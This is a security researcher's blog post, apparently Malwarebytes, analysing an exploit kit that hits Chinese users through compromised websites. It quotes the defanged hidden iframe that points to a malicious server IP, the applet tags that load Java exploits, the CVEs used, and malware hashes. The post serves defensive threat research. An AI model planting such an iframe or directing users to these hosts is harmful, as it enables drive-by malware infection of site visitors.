@@ -1,0 +1,94 @@
+Unusual Exploit Kit Targets Chinese Users (Part 1)
+We are very accustomed to seeing the same exploit kits over and over. Angler EK, Nuclear EK or Fiesta EK all have become familiar faces on this blog.
+Today, we are looking at an exploit kit that we have not seen before. Contrary to its counterparts, it is not used on mainstream websites or via malvertising attacks but rather it specifically targets Chinese websites and users.
+The point of entry is hidden within compromised Chinese websites which have been injected with a malicious iframe. Simply browsing to any of these pages will trigger the drive-by download attack onto vulnerable systems.
+As with other exploit kits, this one fingerprints potential victims and fires the appropriate exploits, except with one difference in that it checks for the presence of a popular Chinese antivirus product before committing itself.
+The exploit toolkit was found on at least two different servers, one located in Malaysia and the other in Singapore. They also host the malware binaries delivered via HTTP or FTP depending on the exploitation technique.
+In this two-part blog series, we will describe the methods used by the attackers to draw victims and compromise them via multiple exploits and scripts before infecting them with malware payloads.
+Exploit Kit Analysis
+There are multiple aspects to this attack, starting with the compromise of an unknown number of Chinese websites with a malicious iframe pointing directly to the exploit kit.
+The kit itself validates the user before exploiting one or more browser plugins. As far as we could tell, only existing and already patched vulnerabilities are used in this attack.
+Infection vector
+We discovered the initial infection vector on a compromised Chinese website that contained a specific iframe:
+Website security firm Sucuri also identified additional ones (here and there) via their SiteCheck service:
+
+The malicious iframe points to a JavaScript file hosted on the root of a server who’s IP address is located in Malaysia:
+<i f r a m e name='z4Pdb4sl' src='hxxp://101.99.68.18/jquery.min.js' width='1' height='1' scrolling='no' style='border: 0px #000000 hidden; margin: 0px; padding: 0px;'>
+The same URL also exists on a server in Singapore: 202.172.54.119/jquery.min.js
+It’s worth noting that the name the malware authors picked (jquery.min.js) is the name of a legitimate library called jQuery. It is common for websites to reference third party URLs to load external APIs and libraries.
+However, in this case the file has nothing to do with jQuery and instead is an exploit kit landing page.
+Exploit kit overview
+Exploit kit servers
+IP records (courtesy of Robtex):
+
+As is the case with most exploit kits, this one contains the same primary elements:
+
+A landing page
+Various exploits
+Malware payloads
+
+Traffic and URL structure (Fiddler capture)
+
+Surprisingly, none of the code base is encrypted. Most modern (if not all) exploit kits heavily encode their scripts to prevent easy reverse engineering but this one doesn’t.
+Landing page
+The code for the landing page is quite straightforward and does the typical ‘fingerprinting’ calls to determine what the victim is running.
+Browser detection
+
+Java detection in Internet Explorer
+
+Java detection in Firefox
+
+Flash Player detection
+
+Silverlight detection
+
+Anti AV detection
+Using the XMLDOM exploit (CVE ), the landing page looks for the presence of Qihoo 360 Total Security:
+
+Qihoo 360 Technology is a very large Chinese Internet company boasting close to 500 million active users. The exploit kit will not continue with its payload if it detects the user is running the Qihoo antivirus.
+
+Exploit files
+We noticed three different types of files that tried to download the final payload:
+
+Java exploits (CVE-2011-3544 and CVE-2012-4681)
+Internet Explorer exploit (CVE-2014-6332)
+Flash exploit (CVE-2015-0311 thanks @ropchain)
+
+Java exploits
+The Java applets (VacnaHohoyg4.jar, kflrtGp.jar) are called via sub pages:
+<h t m l><head></head><body><applet archive="VacnaHohoyg4.jar" code="EF6UT.class" width="1" height="1"></applet></body></h t m l>
+<h t m l><head></head><body><applet archive="kflrtGp.jar" code="Nu8qU.class" width="1" height="1"></applet></body></h t m l>
+CVE-2011-3544
+
+CVE-2012-4681
+
+Once again, the applets are not even encrypted and we can clearly see the call to the malware binary which it retrieves from the same server. They made a bit of effort to disguise the file name pretending it is a “.jpg”
+
+Malwarebytes Anti-Exploit blocks this exploit:
+
+Internet Explorer (CVE-2014-6332)
+There is heavy use of multiple VBS scripts in this exploit kit. One that stroke our attention used Wscript to download a malware binary from the server, but, strangely, via FTP:
+
+Malwarebytes Anti-Exploit blocks this exploit:
+
+Even more bizarre (and careless) is the presence of the FTP script containing the username and password, in clear text:
+
+Flash exploit
+File: kTjAhKzI.swf
+
+Malwarebytes Anti-Exploit blocks this exploit:
+
+Malware files
+
+image.png (MD5: 55c447191d9566c7442e25c4caf0d2fe)
+pic.jpg (MD5: 4e8639378d7a302c7474b5e4406dd7b4)
+notepad.exe (MD5: 5a454c795eccf94bf6213fcc4ee65e6d)
+
+In a follow-up blog post, we will analyze the malware drops and in particular what their purpose is.
+Conclusion (Part 1)
+The author(s) of this exploit kit did not really invest much effort into hiding their code or even their own credentials, blunders that professionals would not make.
+The kit is hosted directly on fairly unsecure servers located (as far as we know) in the Asia Pacific region. Other Asian exploit kits come to mind (Gondad and CK VIP EK) but those two were more sophisticated than this one, although it is possible that the author got inspired by them.
+The exploit code is fairly straightforward and mostly aimed at older computers (with the exception of the Flash exploit). But considering the targeted users, this might not be a problem.
+According to data from Zhongguancun Online, the vast majority of Chinese PC users, roughly 200 million, or 70 percent, are running Windows XP. A quote from that Reuters article is particularly interesting: “Qihoo 360 will continue to provide Windows XP support to Chinese users as long as there are still XP users in China.”
+This makes sense with the authors of this exploit kit deciding to detect the presence of the Qihoo antivirus and avoiding it. There would still be a large number of users running vulnerable computers with little to no protection at all.
+Stay tuned for the follow-up to this story where we dig into the actual purpose of this exploit kit, since it really only is the vehicle for the bad guys’ objective: compromising end-user systems.
